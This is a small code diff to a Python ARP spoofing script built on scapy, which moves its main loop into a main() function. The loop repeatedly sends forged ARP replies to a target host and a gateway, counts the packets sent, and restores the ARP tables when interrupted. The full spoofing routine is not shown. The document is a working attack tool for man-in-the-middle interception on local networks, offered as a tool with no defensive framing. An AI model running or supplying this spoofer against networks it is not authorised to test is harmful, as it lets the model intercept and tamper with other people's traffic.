@@ -56,19 +56,22 @@ def restore(dest_ip, src_ip):
     scapy.sendp(ether / packet, count=4, verbose=False)
 
 
-(target_ip, gateway_ip) = get_args()
+def main():
+    (target_ip, gateway_ip) = get_args()
 
-sent_packets = 0
+    sent_packets = 0
 
-try:
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets = sent_packets + 2
-        print(f'\r/+/ Total Packets Sent: {sent_packets}', end='')
-        time.sleep(2)
-except KeyboardInterrupt:
-    print('\n/!/ Quitting ARP Spoofer.')
-    print('/-/ Restoring ARP Records.')
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+    try:
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent_packets = sent_packets + 2
+            print(f'\r/+/ Total Packets Sent: {sent_packets}', end='')
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print('\n/!/ Quitting ARP Spoofer.')
+        print('/-/ Restoring ARP Records.')
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+
+main()
